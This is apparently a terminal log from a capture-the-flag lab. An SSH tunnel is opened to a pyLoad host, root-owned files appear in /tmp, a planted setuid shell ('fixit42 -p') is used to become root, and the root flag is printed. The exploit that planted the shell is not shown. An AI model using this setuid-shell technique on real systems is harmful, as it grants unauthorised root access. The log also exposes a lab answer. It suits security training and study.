
```sh
┌──(kali㉿kali)-[~]
└─$ ssh sau@10.10.11.214 -L 8000:127.0.0.1:8000
sau@10.10.11.214´s password: 
Last login: Mon Sep  4 20:25:03 2023 from 10.10.14.132
sau@pc:~$ cd /tmp
sau@pc:/tmp$ ls -la
total 80
drwxrwxrwt 19 root root 4096 Sep  4 22:13 .
drwxr-xr-x 21 root root 4096 Apr 27 15:23 ..
drwxrwxrwt  2 root root 4096 Sep  4 14:14 .ICE-unix
drwxrwxrwt  2 root root 4096 Sep  4 14:14 .Test-unix
drwxrwxrwt  2 root root 4096 Sep  4 14:14 .X11-unix
drwxrwxrwt  2 root root 4096 Sep  4 14:14 .XIM-unix
drwxrwxrwt  2 root root 4096 Sep  4 14:14 .font-unix
drwxr-xr-x  4 root root 4096 Sep  4 14:15 pyLoad
drwx------  3 root root 4096 Sep  4 14:15 snap-private-tmp
drwx------  3 root root 4096 Sep  4 14:14 systemd-private-e17797b5ade84162888fc187856b672b-ModemManager.service-BN2Evi
drwx------  3 root root 4096 Sep  4 22:13 systemd-private-e17797b5ade84162888fc187856b672b-fwupd.service-c40zIg
drwx------  3 root root 4096 Sep  4 14:14 systemd-private-e17797b5ade84162888fc187856b672b-systemd-logind.service-Mi32Hg
drwx------  3 root root 4096 Sep  4 14:15 systemd-private-e17797b5ade84162888fc187856b672b-systemd-resolved.service-7A2sCg
drwx------  2 sau  sau  4096 Sep  4 19:11 tmp.im5PIuoIbO
drwx------  2 sau  sau  4096 Sep  4 17:41 tmp3cdndyle
drwx------  2 root root 4096 Sep  4 14:15 tmp5yinqlrw
drwx------  2 sau  sau  4096 Sep  4 17:42 tmpq2awc00y
drwx------  2 sau  sau  4096 Sep  4 17:03 tmux-1001
-rw-r--r--  1 root root  203 Sep  4 17:49 try.txt
drwx------  2 root root 4096 Sep  4 14:15 vmware-root_735-4257003928


sau@pc:/tmp$ ls -la
total 80
drwxrwxrwt 19 root root 4096 Sep  4 22:32 .
drwxr-xr-x 21 root root 4096 Apr 27 15:23 ..
drwxrwxrwt  2 root root 4096 Sep  4 14:14 .ICE-unix
drwxrwxrwt  2 root root 4096 Sep  4 14:14 .Test-unix
drwxrwxrwt  2 root root 4096 Sep  4 14:14 .X11-unix
drwxrwxrwt  2 root root 4096 Sep  4 14:14 .XIM-unix
drwxrwxrwt  2 root root 4096 Sep  4 14:14 .font-unix
-rw-r--r--  1 root root    0 Sep  4 22:32 hithere
drwxr-xr-x  4 root root 4096 Sep  4 14:15 pyLoad
drwx------  3 root root 4096 Sep  4 14:15 snap-private-tmp
drwx------  3 root root 4096 Sep  4 14:14 systemd-private-e17797b5ade84162888fc187856b672b-ModemManager.service-BN2Evi
drwx------  3 root root 4096 Sep  4 22:13 systemd-private-e17797b5ade84162888fc187856b672b-fwupd.service-c40zIg
drwx------  3 root root 4096 Sep  4 14:14 systemd-private-e17797b5ade84162888fc187856b672b-systemd-logind.service-Mi32Hg
drwx------  3 root root 4096 Sep  4 14:15 systemd-private-e17797b5ade84162888fc187856b672b-systemd-resolved.service-7A2sCg
drwx------  2 sau  sau  4096 Sep  4 19:11 tmp.im5PIuoIbO
drwx------  2 sau  sau  4096 Sep  4 17:41 tmp3cdndyle
drwx------  2 root root 4096 Sep  4 14:15 tmp5yinqlrw
drwx------  2 sau  sau  4096 Sep  4 17:42 tmpq2awc00y
drwx------  2 sau  sau  4096 Sep  4 17:03 tmux-1001
-rw-r--r--  1 root root  203 Sep  4 17:49 try.txt
drwx------  2 root root 4096 Sep  4 14:15 vmware-root_735-4257003928




sau@pc:/tmp$ ls -la
total 2392
drwxrwxrwt 19 root root    4096 Sep  4 23:15 .
drwxr-xr-x 21 root root    4096 Apr 27 15:23 ..
drwxrwxrwt  2 root root    4096 Sep  4 14:14 .ICE-unix
drwxrwxrwt  2 root root    4096 Sep  4 14:14 .Test-unix
drwxrwxrwt  2 root root    4096 Sep  4 14:14 .X11-unix
drwxrwxrwt  2 root root    4096 Sep  4 14:14 .XIM-unix
drwxrwxrwt  2 root root    4096 Sep  4 14:14 .font-unix
---sr-xr-x  1 root root 1183448 Sep  4 23:15 fixit42
-rw-r--r--  1 root root       0 Sep  4 22:32 hithere
drwxr-xr-x  4 root root    4096 Sep  4 14:15 pyLoad
drwx------  3 root root    4096 Sep  4 14:15 snap-private-tmp
drwx------  3 root root    4096 Sep  4 14:14 systemd-private-e17797b5ade84162888fc187856b672b-ModemManager.service-BN2Evi
drwx------  3 root root    4096 Sep  4 22:13 systemd-private-e17797b5ade84162888fc187856b672b-fwupd.service-c40zIg
drwx------  3 root root    4096 Sep  4 14:14 systemd-private-e17797b5ade84162888fc187856b672b-systemd-logind.service-Mi32Hg
drwx------  3 root root    4096 Sep  4 14:15 systemd-private-e17797b5ade84162888fc187856b672b-systemd-resolved.service-7A2sCg
drwx------  2 sau  sau     4096 Sep  4 19:11 tmp.im5PIuoIbO
drwx------  2 sau  sau     4096 Sep  4 17:41 tmp3cdndyle
drwx------  2 root root    4096 Sep  4 14:15 tmp5yinqlrw
drwx------  2 sau  sau     4096 Sep  4 17:42 tmpq2awc00y
drwx------  2 sau  sau     4096 Sep  4 17:03 tmux-1001
-rw-r--r--  1 root root     203 Sep  4 17:49 try.txt
drwx------  2 root root    4096 Sep  4 14:15 vmware-root_735-4257003928
sau@pc:/tmp$ ./fixit42 -p
fixit42-5.0# whoami
root
fixit42-5.0# cd /root
fixit42-5.0# ls -la
total 68
drwx------  7 root root  4096 Apr 27 15:32 .
drwxr-xr-x 21 root root  4096 Apr 27 15:23 ..
lrwxrwxrwx  1 root root     9 Jan 11  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root  4096 Apr  4 10:25 .cache
drwxr-xr-x  3 root root  4096 Apr  4 10:25 .local
-rw-r--r--  1 root root   161 Dec  5  2019 .profile
drwxr-xr-x  7 root root  4096 Jan 11  2023 .pyload
-rw-------  1 root root  3203 Apr 27 15:32 .viminfo
drwxr-xr-x  3 root root  4096 Apr 27 13:15 Downloads
-rw-r-----  1 root root    33 Sep  4 14:15 root.txt
drwx------  3 root root  4096 Jan 11  2023 snap
-rw-r--r--  1 root root 24576 Jan 11  2023 sqlite.db.bak
fixit42-5.0# cat root.txt
2182616a667cdcc826cba2796a9d1bee

```